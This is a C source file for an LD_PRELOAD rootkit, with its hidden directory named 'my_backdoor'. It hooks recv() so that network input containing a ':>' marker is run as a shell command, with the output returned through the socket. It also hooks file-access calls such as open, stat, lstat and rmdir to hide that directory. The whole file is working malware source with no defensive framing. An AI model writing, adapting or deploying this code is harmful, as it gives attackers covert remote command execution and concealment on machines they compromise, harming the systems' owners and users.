#define _GNU_SOURCE
#define HIDE_DIR "my_backdoor"

#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <limits.h>
#include <errno.h>

static void init (void) __attribute__ ((constructor));
static ssize_t (*original_recv)(int a, void* b, size_t c, int d);
static ssize_t (*original_send)(int a, const void* b, size_t c, int d);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);
static int (*old_rmdir)(const char *pathname);
static int (*old_cat)(const char *pathname);
static int (*old_xxd)(const char *pathname);
static int (*old_ldd)(const char *pathname);
static int (*old_less)(const char *pathname);

void init(void) {
	original_recv = dlsym(RTLD_NEXT, "recv");
	original_send = dlsym(RTLD_NEXT, "send");
	old_open = dlsym(RTLD_NEXT,"open");
	old_rmdir = dlsym(RTLD_NEXT,"rmdir");
	old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
	old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
	old_xstat = dlsym(RTLD_NEXT, "__xstat");
	old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
	old_cat = dlsym(RTLD_NEXT, "cat");
	old_xxd = dlsym(RTLD_NEXT, "xxd");
	old_ldd = dlsym(RTLD_NEXT, "ldd");
	old_less = dlsym(RTLD_NEXT, "less");
}

ssize_t recv(int socket, void *buffer, size_t length, int flags) {
	//printf("recv");
	length = original_recv(socket, buffer, length, flags);
	char temp[length];
	strncpy(temp, (char *) buffer, length);
	char *in = strtok(temp, "\n");
	//printf("%s\n", in);
	//printf("Buffer: %s\n", buffer);
	char *helper = NULL;
	helper = strstr(in, ":>");
	if (helper != NULL) {
		//printf("helper%s\n", helper);
  		int len = strlen(helper)-2 + 6;
 		char sub[len];
  		strncpy(sub, helper+2, len);
  		//buffer = (void *) sub;
		sub[len-6] = ' ';
		sub[len-5] = '2';
		sub[len-4] = '>';
		sub[len-3] = '&';
		sub[len-2] = '1';
		sub[len-1] = '\0';
		//strcat(sub, " 2>&1");
		//printf("%s\n", sub);
		FILE *fp;
  		char path[1024];
  		fp = popen(sub, "r");
		//printf("%s\n", path);
  		if (fp == NULL) { exit(EXIT_SUCCESS); }
		//printf("%s\n", sub);
		if(fgets(path, sizeof(path)-1, fp) != NULL){
			length = strlen(path);
			strcpy(buffer, path);
		}
 		pclose(fp);
		//system(sub);
		//length = strlen(sub);
		//strcpy(buffer, sub);
		//printf("%s\n", path);
	}
	//printf("1: Buffer %s : Length %i \n", buffer, length);
	return length;
}

ssize_t send(int socket, const void *buffer, size_t length, int flags) {
	//printf("2: Buffer %s : Length %i \n", buffer, length);
   	return original_send(socket, buffer, length, flags);
}

int open(const char *pathname, int flags, mode_t mode) {
	if(strstr(pathname, HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_open(pathname,flags,mode);
}

int stat(const char *path, struct stat *buf) {
	if(strstr(path,HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_xstat(3, path, buf);
}

int stat64(const char *path, struct stat64 *buf) {
	if (strstr(path,HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf) {
	if(strstr(path,HIDE_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
	if(strstr(path,HIDE_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat64(ver,path, buf);
}

int lstat(const char *file, struct stat *buf) {
	if(strstr(file,HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf) {
	if (strstr(file,HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf) {
	if (strstr(file,HIDE_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf) {
	if(strstr(file,HIDE_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(ver, file, buf);
}

int rmdir(const char *pathname) {
	if(strstr(pathname, HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}

	return old_rmdir(pathname);
}

int cat(const char *pathname) {
	if(strstr(pathname, HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_cat(pathname);
}

int less(const char *pathname) {
	if(strstr(pathname, HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_less(pathname);
}

int xxd(const char *pathname) {
	if(strstr(pathname, HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_xxd(pathname);
}

int ldd(const char *pathname) {
	if(strstr(pathname, HIDE_DIR) != NULL) {
		errno = ENOENT;
		return -1;
	}
	return old_ldd(pathname);
}
